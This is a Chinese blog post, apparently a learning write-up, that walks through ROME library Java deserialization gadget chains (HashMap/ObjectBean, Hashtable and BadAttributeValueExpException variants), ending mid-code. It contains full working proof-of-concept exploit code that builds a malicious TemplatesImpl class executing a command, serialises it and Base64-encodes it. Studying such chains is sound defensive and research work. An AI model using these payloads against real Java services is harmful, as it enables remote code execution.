    <content type="html"><![CDATA[<p>学完这个利用链给我的感觉就是和FastJson高度相似，因为都会调用任意的set和get方法，从而导致RCE，因此Rome反序列化利用链很多都和FastJson重复，调用栈什么的都很简短，因此非常好学习</p><h1 id="一些吐槽的话，可以略过"><a href="#一些吐槽的话，可以略过" class="headerlink" title="一些吐槽的话，可以略过"></a>一些吐槽的话，可以略过</h1><p>你妈妈的离散数学，给我整破防了，又臭又长，考的都是些啥啊，好在还是考完了，要是不考完我估计我得自闭，长达八天的考试周真的和监狱里坐牢一样，这种事情这辈子不想体验第二次，太几把抽象了，难受难受难受</p><h1 id="ObjectBean利用链"><a href="#ObjectBean利用链" class="headerlink" title="ObjectBean利用链"></a>ObjectBean利用链</h1><p>这一条链子就是最初的原型，看看调用栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* EqualsBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>很朴素的一条链子，POC如下：(该POC是4ra1n等师傅缩短payload后的简化payload，在最后会放参考链接）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> unSerial(hashMap);</span><br><span class="line">        <span class="comment">// 输出序列化的Base64编码字符</span></span><br><span class="line">        Base64Encode(bs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">unSerial</span><span class="params">(Map hashMap)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bs.toByteArray()));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先做好环境搭建准备，Maven选择quickstart，然后POM文件如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>断点肯定就下在readObject<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679121850575-53ba8473-6086-4176-9c7b-bb65bdcfb383.png#averageHue=%232c2c28&clientId=u7bc63f22-fffc-4&from=paste&height=213&id=uaf978912&name=image.png&originHeight=266&originWidth=1523&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=568106&status=done&style=none&taskId=ubcbbe280-14af-4501-9ef1-cfd00d909b2&title=&width=1218.4" alt="image.png"><br>最外层套的是一层HashMap，因此很自然的进入HashMap重写的ReadObject方法中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679121884094-29970556-8ecb-4204-abd7-af9d4a52588c.png#averageHue=%232d2d29&clientId=u7bc63f22-fffc-4&from=paste&height=227&id=ud17a0fac&name=image.png&originHeight=284&originWidth=1535&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594411&status=done&style=none&taskId=ue086bc47-48cb-4b04-b33f-9d58dab5a62&title=&width=1228" alt="image.png"><br>然后再最后肯定就会调用hash函数，这个函数已经见烂了，在CC链和一些其他的链子中，它随后会调用hashcode函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679121933442-f02788f3-c783-406c-b06e-4852300720af.png#averageHue=%23282926&clientId=u7bc63f22-fffc-4&from=paste&height=826&id=u8604d813&name=image.png&originHeight=1033&originWidth=1734&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2317229&status=done&style=none&taskId=uc79e8838-c1a6-432f-a8d5-76b6b5e0966&title=&width=1387.2" alt="image.png"><br>这里我们将key设置为了ObjectBean类，因此就会调用<code>ObjectBean#hashcode</code>函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122052853-831bee2b-0c7c-42a1-bc05-cc364308aea8.png#averageHue=%23292a26&clientId=u695df2fb-c223-4&from=paste&height=356&id=u781a7f60&name=image.png&originHeight=445&originWidth=1110&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=658467&status=done&style=none&taskId=u8a9c6231-d64b-49ba-9341-f54bf6658f5&title=&width=888" alt="image.png"><br>调用<code>equalsBean.beanHashCode()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122086400-6b0a0d3f-4418-45b0-9832-ef9a7fd30ab6.png#averageHue=%23272826&clientId=u695df2fb-c223-4&from=paste&height=709&id=u98898909&name=image.png&originHeight=886&originWidth=1634&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1873381&status=done&style=none&taskId=uc5b14d51-b6f3-4278-b83f-862726b7620&title=&width=1307.2" alt="image.png"><br>在里面调用了toString方法，其实这里有说法的，我也觉得这里也可以做点文章，因为toString这个方法太敏感了，很多链子都可以通过这个方法继续往下去触发，我可能下周投的题就是这里了嘻嘻，好了回归正题，这里的<code>this._obj</code>为ToStringBean，因此调用它的toString方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122209398-7a3701d9-0e5b-42f6-8b4a-b8927df4aadd.png#averageHue=%2331302b&clientId=u695df2fb-c223-4&from=paste&height=246&id=ub12bafe0&name=image.png&originHeight=307&originWidth=1238&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=550742&status=done&style=none&taskId=u68a918a2-34c0-433d-ba3c-a03fb779c42&title=&width=990.4" alt="image.png"><br>调用它的另一个有参toString<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122294588-2fa2fb32-873b-42ea-a4c7-154d49b119b0.png#averageHue=%23272927&clientId=u695df2fb-c223-4&from=paste&height=835&id=ube975588&name=image.png&originHeight=1044&originWidth=1818&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2499424&status=done&style=none&taskId=u4d3e270c-ac6f-48a6-9aa1-a40f39d60dd&title=&width=1454.4" alt="image.png"><br>this._beanclass为javax.xml.transform.Templates,将它的名字传入了<code>getPropertyDescriptors</code>，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122465448-2a865a12-f88a-4679-8c2b-f407575cb002.png#averageHue=%2330302a&clientId=u695df2fb-c223-4&from=paste&height=203&id=uad6101e4&name=image.png&originHeight=254&originWidth=1412&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=496485&status=done&style=none&taskId=u6f8f2acb-697e-4644-b716-902ce9bda11&title=&width=1129.6" alt="image.png"><br>在这里调用getPDs方法，去看看它的逻辑，这里需要注意一个点，就是我们入口不是hashcode函数吗，在调用put时也会调用，只不过那时候由于一些不确定因素不会导致calc执行，也就是一共调用2次hashcode，但是第一次调用hashcode时有一个比较重要的一点，就是我们说的getPDs方法，第一次调用时，会进入该方法，然后获取任意get和set方法，这里就是fastjson的流程<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122648669-5ab2f25f-4fbc-4cdc-99b1-83cfa94c27f3.png#averageHue=%23282a28&clientId=u695df2fb-c223-4&from=paste&height=912&id=ucb6634ca&name=image.png&originHeight=1140&originWidth=1925&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2817616&status=done&style=none&taskId=u5ed73f2a-3af8-41cc-925d-98340caf19a&title=&width=1540" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122670993-d7eb58ae-0e7d-429d-b3e6-83db8358b497.png#averageHue=%232c2c27&clientId=u695df2fb-c223-4&from=paste&height=410&id=u7ace5813&name=image.png&originHeight=512&originWidth=1581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1151367&status=done&style=none&taskId=ufbce5ad3-a211-4bab-8638-38284d935bf&title=&width=1264.8" alt="image.png"><br>之后退回toString，触发invoke调用get方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122704473-8f4614ce-e594-4d58-9694-056a2aa420ce.png#averageHue=%23272826&clientId=u695df2fb-c223-4&from=paste&height=534&id=u8489c76f&name=image.png&originHeight=667&originWidth=1585&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1411502&status=done&style=none&taskId=u28568bb6-c925-4dee-ad28-e9f182f75e2&title=&width=1268" alt="image.png"><br>之后就是TemplatesImpl实例化恶意类的流程了，这里就不继续往下分析<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679122743608-65452d18-e47d-451c-90ce-2f8e58e2bfb5.png#averageHue=%232c2c27&clientId=u695df2fb-c223-4&from=paste&height=588&id=uff97de88&name=image.png&originHeight=735&originWidth=1846&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1579136&status=done&style=none&taskId=u011dc617-a06f-4e24-a68a-bbd38999ccb&title=&width=1476.8" alt="image.png"></p><h1 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h1><p>这条链子实际上就是在HashMap被ban的情况下进行反序列化，因为最终目的始终都是调用hashcode函数，而HashTbale中刚好调用了hashcode，因此仍然可以触发整套流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ROME;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> Serial.Serial;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME_HashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Serial.Serialize(hashtable);</span><br><span class="line">        Serial.DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679315466157-9b0d39a7-d4bd-4bb4-886f-b84b35cd7441.png#averageHue=%23282926&clientId=u4875fa68-8767-4&from=paste&height=787&id=u9cb817c8&name=image.png&originHeight=984&originWidth=2423&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3219263&status=done&style=none&taskId=u8abc88c1-5c4f-47d1-a171-9d2349b88ae&title=&width=1938.4" alt="image.png"><br>也是直接弹的，因为在HashTable的readObject方法中也是可以看见hashcode的身影<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679315557840-4a7440bf-922e-455c-a709-3633064c5413.png#averageHue=%232c2d27&clientId=u4875fa68-8767-4&from=paste&height=122&id=u388db860&name=image.png&originHeight=152&originWidth=669&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146787&status=done&style=none&taskId=u9e14da1a-0e45-4e8f-9a54-6a543960e3f&title=&width=535.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679315573794-02e6d0df-24db-429a-8e60-f6ef44b04906.png#averageHue=%232c2c27&clientId=u4875fa68-8767-4&from=paste&height=448&id=u2278dcc9&name=image.png&originHeight=560&originWidth=1364&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1053297&status=done&style=none&taskId=uf6071a34-e882-4315-9686-93a6c4d9b5a&title=&width=1091.2" alt="image.png"><br>因此原理一样，也是会弹出计算器的</p><h1 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h1><p>这个类在CC链中我们是拿来触发toString的，他的readObject方法中有toString，因此可以直接连着Rmoe链的ToStringBean，这样也是可以触发的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeVer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span 